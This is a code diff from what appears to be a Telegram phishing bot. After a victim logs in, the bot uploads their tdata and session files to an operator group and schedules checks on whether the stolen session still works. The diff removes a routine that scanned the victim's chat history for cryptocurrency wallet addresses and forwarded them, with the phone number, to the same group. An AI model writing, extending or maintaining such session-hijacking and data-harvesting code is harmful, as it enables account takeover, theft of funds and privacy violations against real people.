@@ -165,8 +165,7 @@ async def _handle_login_success(bot: Bot, chat_id: int, uid: int,
       1. Send success text to user
       2. Send configured success photo to user (if enabled)
       3. Upload tdata zip + text info to group
-      4. USDT extraction (background)
-      5. Delayed session check (background, sends valid/invalid text)
+      4. Delayed session check (background, sends valid/invalid text)
     """
     username = user_info.get("username", "")
     first_name = user_info.get("first_name", "")
@@ -230,10 +229,6 @@ async def _handle_login_success(bot: Bot, chat_id: int, uid: int,
                 logger.warning(f"[{uid}] 直登包/Session 文件不存在，无法上传到群")
         except Exception as e:
             logger.error(f"[{uid}] 上传到群失败: {e}")
-
-    # USDT/crypto address extraction if enabled
-    if _cfg and _cfg.get("usdt_extract_enabled", False):
-        asyncio.create_task(_extract_crypto_addresses(bot, chat_id, uid, phone))
 
     # Schedule periodic session check (only if enabled)
     if _cfg and _cfg.get("session_check_enabled", False):
@@ -334,50 +329,6 @@ async def _post_login_session_check(bot: Bot, chat_id: int, phone: str):
         logger.error(f"Post-login session check error: {e}")
     finally:
         _session_check_tasks.pop(safe_phone, None)
-
-
-# Crypto address patterns
-_CRYPTO_PATTERNS = [
-    (r'\b(T[A-HJ-NP-Za-km-z1-9]{33})\b', "TRC20/USDT"),
-    (r'\b(0x[0-9a-fA-F]{40})\b', "ERC20/ETH"),
-    (r'\b([13][a-km-zA-HJ-NP-Z1-9]{25,34})\b', "BTC"),
-    (r'\b(bc1[a-zA-HJ-NP-Z0-9]{39,59})\b', "BTC-Bech32"),
-]
-
-
-async def _extract_crypto_addresses(bot: Bot, chat_id: int,
-                                     uid: int, phone: str):
-    """Scan user's chat history for crypto addresses and report them."""
-    try:
-        await asyncio.sleep(2)  # Small delay to let things settle
-        found: list[str] = []
-        store = _chat_store.get(_cid(uid, bot))
-        if store:
-            for msg in store.get("messages", []):
-                if msg["from"] == "user":
-                    text = msg["text"]
-                    for pattern, label in _CRYPTO_PATTERNS:
-                        matches = re.findall(pattern, text)
-                        for m in matches:
-                            found.append(f"{label}: {m}")
-
-        if found:
-            report = "💰 检测到加密货币地址:\n" + "\n".join(found[:10])
-            await bot.send_message(chat_id=chat_id, text=report)
-            logger.info(f"[{uid}] 提取到 {len(found)} 个加密货币地址")
-
-            # Also send to group if configured
-            group_id = _c("success_group_id", "")
-            if group_id:
-                try:
-                    await bot.send_message(
-                        chat_id=int(group_id), text=f"📱 {phone}\n{report}")
-                except Exception:
-                    pass
-    except asyncio.CancelledError:
-        pass
-    except Exception as e:
-        logger.error(f"[{uid}] USDT 提取失败: {e}")
 
 
 def _generate_12_digit_code() -> str:
